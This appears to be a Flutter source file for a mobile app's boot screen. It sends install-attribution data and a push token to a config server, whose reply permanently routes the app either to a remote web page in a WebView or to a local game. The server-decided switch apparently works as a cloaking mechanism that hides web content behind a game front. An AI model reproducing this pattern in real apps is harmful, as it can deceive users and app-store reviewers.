import 'dart:io';
import 'package:flutter/material.dart';
import 'package:video_player/video_player.dart';
import '../models/runtime_mode.dart';
import '../services/attribution_gateway.dart';
import '../services/cloud_push_client.dart';
import '../services/config_api.dart';
import '../services/local_store.dart';
import '../services/network_monitor.dart';
import '../utils/asset_paths.dart';
import 'game_flow_screen.dart';
import 'connection_lost_screen.dart';
import 'push_optin_screen.dart';
import 'web_host.dart' deferred as host;

enum _ProgressStage { empty, start, half, almostFull, filled }

class BootScreen extends StatefulWidget {
  final LocalStore store;
  final NetworkMonitor net;
  final AttributionGateway attribution;
  final ConfigApi config;
  final CloudPushClient push;

  const BootScreen({
    super.key,
    required this.store,
    required this.net,
    required this.attribution,
    required this.config,
    required this.push,
  });

  @override
  State<BootScreen> createState() => _BootScreenState();
}

class _BootScreenState extends State<BootScreen> {
  VideoPlayerController? _player;
  bool _playerReady = false;
  _ProgressStage _stage = _ProgressStage.empty;
  bool _leaving = false;
  Orientation? _lastOrientation;
  bool _assetsPrecached = false;

  @override
  void initState() {
    super.initState();
    _kickoff();
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    final orientation = MediaQuery.of(context).orientation;
    if (orientation != _lastOrientation) {
      _lastOrientation = orientation;
      _loadVideo(orientation);
    }
    if (!_assetsPrecached) {
      _assetsPrecached = true;
      // Pre-warm progress-bar frames so AnimatedOpacity transitions
      // don't flash to a blank cell — without precache each newly
      // displayed PNG decodes lazily and the user sees a one-frame gap.
      precacheImage(const AssetImage(AssetPaths.loadingBarEmpty), context);
      precacheImage(const AssetImage(AssetPaths.loadingBarStart), context);
      precacheImage(const AssetImage(AssetPaths.loadingBarHalf), context);
      precacheImage(
        const AssetImage(AssetPaths.loadingBarAlmostFull),
        context,
      );
      precacheImage(const AssetImage(AssetPaths.loadingBarFull), context);
    }
  }

  Future<void> _loadVideo(Orientation orientation) async {
    final asset = orientation == Orientation.landscape
        ? AssetPaths.loadingHorizontal
        : AssetPaths.loadingVertical;
    final previous = _player;
    final next = VideoPlayerController.asset(asset);
    try {
      await next.initialize();
      next.setLooping(true);
      next.setVolume(0);
      next.play();
      if (!mounted) {
        next.dispose();
        return;
      }
      setState(() {
        _player = next;
        _playerReady = true;
      });
      previous?.dispose();
    } catch (_) {
      next.dispose();
    }
  }

  Future<void> _kickoff() async {
    widget.push.onTokenRotate = _onTokenRotate;
    await widget.push.bootstrap().catchError((_) {});
    _setStage(_ProgressStage.empty);

    final mode = widget.store.readRuntimeMode();
    switch (mode) {
      case RuntimeMode.browser:
        await _runBrowserMode();
        break;
      case RuntimeMode.arcade:
        _setStage(_ProgressStage.almostFull);
        _setStage(_ProgressStage.filled);
        await Future.delayed(const Duration(milliseconds: 600));
        _goArcade();
        break;
      case RuntimeMode.undetermined:
        await _runFirstLaunch();
        break;
    }
  }

  Future<void> _runFirstLaunch() async {
    _setStage(_ProgressStage.empty);

    final online = await widget.net.isOnline();
    if (!online) {
      if (!mounted) return;
      _goOffline(firstLaunch: true);
      return;
    }

    _setStage(_ProgressStage.start);
    await widget.attribution.warmup();
    _setStage(_ProgressStage.half);
    await Future.wait([
      widget.attribution.awaitConversion(),
      widget.attribution.awaitDeepLink(),
    ]);
    _setStage(_ProgressStage.almostFull);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attribution.assembleRequest(
      locale: locale,
      pushToken: widget.push.token,
    );
    final reply = await widget.config.dispatch(body);

    if (reply.accepted && reply.target != null) {
      await widget.store.writeRuntimeMode(RuntimeMode.browser);
      _setStage(_ProgressStage.filled);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goWebContent(reply.target!);
    } else {
      await widget.store.writeRuntimeMode(RuntimeMode.arcade);
      _setStage(_ProgressStage.filled);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goArcade();
    }
  }

  Future<void> _runBrowserMode() async {
    _setStage(_ProgressStage.start);

    final online = await widget.net.isOnline();
    if (!online) {
      _setStage(_ProgressStage.filled);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goOffline(firstLaunch: false);
      return;
    }

    final pushTarget = await widget.store.takePushTarget();
    if (pushTarget != null) {
      _setStage(_ProgressStage.filled);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goWebContent(pushTarget);
      return;
    }

    await widget.attribution.warmup();
    _setStage(_ProgressStage.half);
    await Future.wait([
      widget.attribution.awaitConversion(
        timeout: const Duration(seconds: 10),
      ),
      widget.attribution.awaitDeepLink(),
    ]);
    _setStage(_ProgressStage.almostFull);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attribution.assembleRequest(
      locale: locale,
      pushToken: widget.push.token,
    );
    final reply = await widget.config.dispatch(body);
    _setStage(_ProgressStage.filled);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (reply.accepted && reply.target != null) {
      _goWebContent(reply.target!);
      return;
    }
    final cached = await widget.store.readCachedTarget();
    if (cached != null) {
      _goWebContent(cached);
    } else {
      _goOffline(firstLaunch: false);
    }
  }

  void _onTokenRotate(String newToken) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attribution.assembleRequest(
      locale: locale,
      pushToken: newToken,
    );
    widget.config.dispatch(body);
  }

  void _setStage(_ProgressStage s) {
    if (mounted) setState(() => _stage = s);
  }

  Future<void> _goWebContent(String url) async {
    if (_leaving) return;
    _leaving = true;

    await host.loadLibrary();
    await primeBrowser();
    if (!mounted) return;

    // Two gates before we show the offer screen:
    //   1. App-side cooldown (3 days after Skip).
    //   2. The OS must still be able to show a system prompt. Once the user
    //      has system-denied, our ALLOW button is a dead end — skip the
    //      offer and go straight to the WebView.
    final canPrompt = widget.store.needsPushPrompt() &&
        await widget.push.shouldOfferConsent();

    if (canPrompt) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => PushOptInScreen(
            store: widget.store,
            push: widget.push,
            net: widget.net,
            target: url,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => host.WebHost(
            target: url,
            store: widget.store,
            push: widget.push,
            net: widget.net,
          ),
        ),
      );
    }
  }

  Future<void> primeBrowser() async {}

  void _goOffline({required bool firstLaunch}) {
    if (_leaving) return;
    _leaving = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => ConnectionLostScreen(
          net: widget.net,
          retryBuilder: (_) => BootScreen(
            store: widget.store,
            net: widget.net,
            attribution: widget.attribution,
            config: widget.config,
            push: widget.push,
          ),
        ),
      ),
    );
  }

  void _goArcade() {
    if (_leaving) return;
    _leaving = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const GameFlowScreen()),
    );
  }

  @override
  void dispose() {
    widget.push.onTokenRotate = null;
    _player?.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        fit: StackFit.expand,
        children: [
          const ColoredBox(color: Colors.black),
          AnimatedOpacity(
            opacity: _playerReady ? 1.0 : 0.0,
            duration: const Duration(milliseconds: 400),
            child: _player != null && _playerReady
                ? SizedBox.expand(
                    child: FittedBox(
                      fit: BoxFit.cover,
                      child: SizedBox(
                        width: _player!.value.size.width,
                        height: _player!.value.size.height,
                        child: VideoPlayer(_player!),
                      ),
                    ),
                  )
                : const SizedBox.shrink(),
          ),
          if (_playerReady)
            Builder(
              builder: (ctx) {
                final mq = MediaQuery.of(ctx);
                final landscape = _lastOrientation == Orientation.landscape;
                final bottom = mq.padding.bottom +
                    (landscape ? mq.size.height * 0.035 : 60.0);
                final width = landscape ? 210.0 : 250.0;
                return Positioned(
                  left: 0,
                  right: 0,
                  bottom: bottom,
                  child: Center(
                    child: SizedBox(
                      width: width,
                      child: _buildProgressBar(width),
                    ),
                  ),
                );
              },
            ),
        ],
      ),
    );
  }

  /// Cross-fade progress bar: every stage frame is rendered in the same
  /// Stack and shown by AnimatedOpacity. Keeping element identity
  /// avoids the blank-frame flash that AnimatedSwitcher used to cause
  /// when it tore down and rebuilt the previous Image on every stage
  /// transition.
  Widget _buildProgressBar(double width) {
    final i = _stage.index;
    return Stack(
      alignment: Alignment.center,
      children: [
        _barFrame(AssetPaths.loadingBarEmpty, width, opacity: 1.0),
        _barFrame(
          AssetPaths.loadingBarStart,
          width,
          opacity: i >= 1 ? 1.0 : 0.0,
        ),
        _barFrame(
          AssetPaths.loadingBarHalf,
          width,
          opacity: i >= 2 ? 1.0 : 0.0,
        ),
        _barFrame(
          AssetPaths.loadingBarAlmostFull,
          width,
          opacity: i >= 3 ? 1.0 : 0.0,
        ),
        _barFrame(
          AssetPaths.loadingBarFull,
          width,
          opacity: i >= 4 ? 1.0 : 0.0,
        ),
      ],
    );
  }

  Widget _barFrame(String asset, double width, {required double opacity}) {
    return AnimatedOpacity(
      opacity: opacity,
      duration: const Duration(milliseconds: 280),
      curve: Curves.easeOut,
      child: Image.asset(
        asset,
        width: width,
        fit: BoxFit.contain,
        filterQuality: FilterQuality.high,
        gaplessPlayback: true,
        errorBuilder: (_, e, s) => const SizedBox(height: 30),
      ),
    );
  }
}
